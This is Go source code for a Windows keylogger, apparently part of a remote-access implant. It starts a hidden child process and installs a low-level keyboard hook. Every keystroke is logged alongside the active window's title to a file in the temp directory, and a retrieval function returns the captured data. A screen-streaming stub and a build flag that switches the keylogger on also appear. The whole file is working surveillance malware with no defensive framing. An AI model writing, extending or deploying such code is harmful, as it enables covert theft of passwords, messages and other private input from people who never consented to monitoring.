package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	user32                  = syscall.NewLazyDLL("user32.dll")
	procSetWindowsHookExW   = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
	procGetKeyboardLayout   = user32.NewProc("GetKeyboardLayout")
	procToUnicodeEx         = user32.NewProc("ToUnicodeEx")
	procMapVirtualKeyW      = user32.NewProc("MapVirtualKeyW")
	procGetMessage          = user32.NewProc("GetMessageW")
	procTranslateMessage    = user32.NewProc("TranslateMessage")
	procDispatchMessage     = user32.NewProc("DispatchMessageW")
)

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
	WM_SYSKEYDOWN  = 0x0104
	HC_ACTION      = 0
)

type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

var (
	keylogHook    uintptr
	keylogBuf     strings.Builder
	keylogLastWin string
	keylogOut     *os.File
	keyloggerPID  int
)

func startKeylogger() {
	if !strings.EqualFold(enableKeylogger, "true") && enableKeylogger != "1" {
		log_("startKeylogger: disabled by build config")
		return
	}
	self, err := os.Executable()
	if err != nil {
		log_("startKeylogger: os.Executable failed")
		os.Exit(1)
		return
	}
	cmd := exec.Command(self, "-loglevel")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Start(); err != nil {
		log_(fmt.Sprintf("startKeylogger: Start: %v", err))
		return
	}
	keyloggerPID = cmd.Process.Pid
	log_(fmt.Sprintf("startKeylogger: pid=%d", keyloggerPID))
}

func stopKeylogger() {
	log_(fmt.Sprintf("stopKeylogger: pid=%d", keyloggerPID))
	if keyloggerPID == 0 {
		return
	}
	proc, err := os.FindProcess(keyloggerPID)
	if err != nil {
		log_(fmt.Sprintf("stopKeylogger: FindProcess: %v", err))
		return
	}
	proc.Signal(os.Kill)
	keyloggerPID = 0
}

func runKeylogger() {
	log_("runKeylogger: starting")

	var err error
	keylogOut, err = os.OpenFile(
		os.TempDir()+`\kl.dat`,
		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
		0600,
	)
	if err != nil {
		log_(fmt.Sprintf("runKeylogger: open output: %v", err))
		return
	}
	defer keylogOut.Close()
	cb := syscall.NewCallback(lowLevelKeyboardProc)
	hook, _, err := procSetWindowsHookExW.Call(
		WH_KEYBOARD_LL,
		cb,
		0, 0,
	)
	if hook == 0 {
		log_(fmt.Sprintf("runKeylogger: SetWindowsHookEx failed: %v", err))
		return
	}
	keylogHook = hook
	defer procUnhookWindowsHookEx.Call(hook)
	log_("runKeylogger: hook installed, pumping messages")

	type MSG struct {
		Hwnd    uintptr
		Message uint32
		WParam  uintptr
		LParam  uintptr
		Time    uint32
		Pt      [2]int32
	}

	var msg MSG
	for {
		ret, _, _ := procGetMessage.Call(
			uintptr(unsafe.Pointer(&msg)),
			0, 0, 0,
		)
		if ret == 0 || ret == ^uintptr(0) {
			break
		}
		procTranslateMessage.Call(uintptr(unsafe.Pointer(&msg)))
		procDispatchMessage.Call(uintptr(unsafe.Pointer(&msg)))
	}
}

func lowLevelKeyboardProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
	if nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
		ks := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		vk := ks.VkCode
		hwnd, _, _ := procGetForegroundWindow.Call()
		if hwnd != 0 {
			buf := make([]uint16, 256)
			procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 256)
			winTitle := syscall.UTF16ToString(buf)
			if winTitle != keylogLastWin {
				if keylogOut != nil && keylogBuf.Len() > 0 {
					keylogOut.WriteString(keylogBuf.String() + "\n")
					keylogBuf.Reset()
				}
				if keylogOut != nil {
					keylogOut.WriteString(fmt.Sprintf("[%s]\n", winTitle))
				}
				keylogLastWin = winTitle
			}
		}
		keyStr := vkToStr(vk)
		if keyStr != "" {
			keylogBuf.WriteString(keyStr)
		}
		if vk == 0x0D {
			if keylogOut != nil {
				keylogOut.WriteString(keylogBuf.String() + "\n")
				keylogBuf.Reset()
			}
		}
	}
	ret, _, _ := procCallNextHookEx.Call(keylogHook, uintptr(nCode), wParam, lParam)
	return ret
}

func vkToStr(vk uint32) string {
	specials := map[uint32]string{
		0x08: "[BS]",
		0x09: "[TAB]",
		0x0D: "[ENTER]\n",
		0x1B: "[ESC]",
		0x20: " ",
		0x23: "[END]",
		0x24: "[HOME]",
		0x25: "[LEFT]",
		0x26: "[UP]",
		0x27: "[RIGHT]",
		0x28: "[DOWN]",
		0x2E: "[DEL]",
		0x70: "[F1]", 0x71: "[F2]", 0x72: "[F3]", 0x73: "[F4]",
		0x74: "[F5]", 0x75: "[F6]", 0x76: "[F7]", 0x77: "[F8]",
		0x78: "[F9]", 0x79: "[F10]", 0x7A: "[F11]", 0x7B: "[F12]",
	}
	if s, ok := specials[vk]; ok {
		return s
	}

	var state [256]byte
	procGetAsyncKeyState.Call(uintptr(0x10))
	buf := make([]uint16, 2)
	hkl, _, _ := procGetKeyboardLayout.Call(0)
	procToUnicodeEx.Call(
		uintptr(vk), 0,
		uintptr(unsafe.Pointer(&state[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		2, 0, hkl,
	)
	r := syscall.UTF16ToString(buf)
	if r != "" {
		return r
	}
	return ""
}

func getKeyloggerData() string {
	data, err := os.ReadFile(os.TempDir() + `\kl.dat`)
	if err != nil {
		return ""
	}
	return string(data)
}

func screenStream(x1, y1, x2, y2, quality, intervalMs, jpegQ int) {
	log_(fmt.Sprintf("screenStream: %d,%d,%d,%d q=%d int=%dms", x1, y1, x2, y2, quality, intervalMs))
	for {
		time.Sleep(time.Duration(intervalMs) * time.Millisecond)
	}
}
